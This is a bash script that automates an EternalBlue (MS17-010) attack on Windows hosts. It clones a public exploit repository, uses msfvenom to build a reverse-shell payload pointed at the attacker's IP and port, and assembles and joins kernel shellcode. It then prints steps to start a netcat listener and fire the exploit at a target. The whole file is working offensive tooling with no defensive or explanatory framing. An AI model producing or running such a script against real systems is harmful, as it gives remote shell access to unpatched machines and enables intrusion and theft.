#!/bin/bash

usage()
{
  echo "usage: $0 [-p PAYLOAD] -lhost YOUR_IP -lport LISTENING_PORT [-x64]"
  echo "default payload is windows/shell/reverse_tcp"
}

if [[ $# -eq 0 ]]; then
  usage
  exit 0
fi

while [[ "$1" != "" ]]; do
  case $1 in 
    -p )          shift
                  payload=$1
                  ;;
    -lhost )      shift
                  lhost=$1
                  ;;
    -lport )      shift
                  lport=$1
                  ;;
    -x64 )        x64=true
                  ;;
    -h | -help ) shift
                  usage
                  exit 0
                  ;;
    * )           usage
                  exit 1
  esac
  shift
done

if [ -z "$lhost" ] || [-z "$lport" ]; then
  usage
  exit 1
fi

dir=/tmp/MS17-010
if [ ! -d "$dir" ]; then
  mkdir $dir
  git clone https://github.com/worawit/MS17-010.git $dir
fi

cp $dir/eternalblue_exploit7.py .

if [ "$x64" = true ]; then
  arch="x64"
  if [ -z "$payload" ]; then
    payload="windows/x64/shell/reverse_tcp"
  fi
else
  arch="x86"
  if [ -z "$payload" ]; then
    payload="windows/shell/reverse_tcp"
  fi
fi

msfvenom -p $payload -f raw -o "sc_msf_$arch.bin" EXITFUNC=thread LHOST=$lhost LPORT=$lport
nasm -f bin $dir/shellcode/eternalblue_kshellcode_$arch.asm -o "sc_kernel_$arch.bin"
cat sc_kernel_$arch.bin sc_msf_$arch.bin > sc_$arch.bin
echo "Start your listener: nc -lvnp $lport"
echo "Send payload: python eternalblue_exploit7.py TARGET_IP sc_$arch.bin"
